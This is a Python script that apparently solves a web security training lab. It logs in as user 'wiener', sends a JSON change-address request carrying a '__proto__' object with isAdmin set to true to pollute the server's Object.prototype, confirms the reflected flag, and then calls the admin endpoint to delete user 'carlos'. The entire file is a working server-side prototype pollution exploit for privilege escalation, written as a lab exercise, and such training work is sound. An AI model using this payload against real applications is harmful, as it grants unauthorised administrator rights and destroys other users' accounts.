import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# log in as a low-privileged user
lab.login("wiener", "peter")

# the change-address endpoint accepts a JSON body and merges it into an object
# without filtering __proto__. it also reflects the account object back, so we
# can see "isAdmin": false in the response - that is the gadget property.
# polluting Object.prototype.isAdmin makes every object inherit isAdmin = true.
address = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": lab.session.cookies.get("session"),
    "__proto__": {"isAdmin": True},
}

lab.info("Polluting Object.prototype.isAdmin via change-address...")
resp = lab.session.post(lab.url("/my-account/change-address"), json=address)

if '"isAdmin":true' in resp.text.replace(" ", ""):
    lab.success("isAdmin reflected as true - prototype polluted")
else:
    lab.warn(f"isAdmin not reflected true, response: {resp.text}")

# with admin privileges inherited, the admin panel is now reachable.
# delete carlos to solve the lab.
lab.info("Deleting carlos via the admin panel...")
resp = lab.get("/admin/delete?username=carlos")

lab.check_solved()
